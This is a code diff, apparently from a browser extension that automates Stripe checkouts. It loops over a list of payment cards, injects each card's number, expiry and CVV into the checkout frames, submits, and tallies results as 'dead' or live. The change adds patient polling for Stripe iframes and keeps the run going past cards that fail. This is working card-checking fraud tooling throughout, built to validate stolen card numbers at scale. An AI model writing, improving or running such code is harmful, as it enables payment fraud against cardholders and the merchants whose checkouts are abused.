@@ -310,6 +310,19 @@ async function injectDetect(tabId) {
   return null;
 }
 
+// Wait until at least one fillable card field appears in any frame (up to maxMs)
+async function waitForCardFields(tabId, maxMs = 30000) {
+  const step = 1200;
+  let elapsed = 0;
+  while (elapsed < maxMs) {
+    const filled = await injectFill(tabId, {num:'4242424242424242',mm:'12',yy:'99',cvv:'123'}, {__probe:true});
+    if (filled > 0) return true;
+    await sleep(step);
+    elapsed += step;
+  }
+  return false;
+}
+
 // === Main loop per tab ===
 async function startRun(tabId, cards, settings) {
   if (RUNS.has(tabId) && RUNS.get(tabId).running) {
@@ -333,33 +346,35 @@ async function loop(tabId) {
     if (run.paused) { await sleep(500); continue; }
     const card = run.cards[run.idx];
     run.idx++;
-    // 1) Fill card across all frames — with retry if page is still loading
+
+    // 1) Fill card — retry patiently up to 30s for Stripe iframes to mount
     notifyOverlay(tabId, 'CARD_START', {card: maskCard(card.num), idx: run.idx, total: run.cards.length, status:'filling'});
-    let filled = await injectFill(tabId, card, run.settings);
-    if (filled === 0) {
-      // Retry after 2.5s — Stripe iframes may still be mounting
-      notifyOverlay(tabId, 'WAITING_RESPONSE', {card: maskCard(card.num), status: 'retrying'});
-      await sleep(2500);
+    notifyOverlay(tabId, 'WAITING_RESPONSE', {card: maskCard(card.num), status: 'retrying'});
+
+    const FILL_TIMEOUT = 30000;
+    const FILL_STEP    = 2000;
+    let filled = 0;
+    let fillElapsed = 0;
+    while (fillElapsed < FILL_TIMEOUT) {
       filled = await injectFill(tabId, card, run.settings);
+      if (filled > 0) break;
+      await sleep(FILL_STEP);
+      fillElapsed += FILL_STEP;
     }
+
     if (filled === 0) {
-      // Third attempt after another 2s
-      await sleep(2000);
-      filled = await injectFill(tabId, card, run.settings);
-    }
-    if (filled === 0) {
+      // Still can't find fields — skip this card, don't kill the run
+      run.sessionStats.total++; run.sessionStats.dead++;
       notifyOverlay(tabId, 'CARD_RESULT', {
         card: maskCard(card.num), status: 'dead',
-        message: 'Page not ready — reload Stripe checkout and try again'
+        message: 'Fields not found — skipping card',
+        stats: run.sessionStats
       });
-      run.sessionStats.total++; run.sessionStats.dead++;
-      await recordResult(maskCard(card.num), 'dead', 'Stripe', 'Page not ready');
-      // Stop the run so user can reload and restart
-      run.running = false;
-      notifyOverlay(tabId, 'RUN_STOPPED', {reason:'Page not ready — reload Stripe checkout'});
-      break;
+      await recordResult(maskCard(card.num), 'dead', 'Stripe', 'Fields not found');
+      await sleep(1500);
+      continue; // try next card
     }
-    await sleep(800);
+    await sleep(600);
 
     // 2) Click submit
     await injectClickSubmit(tabId);
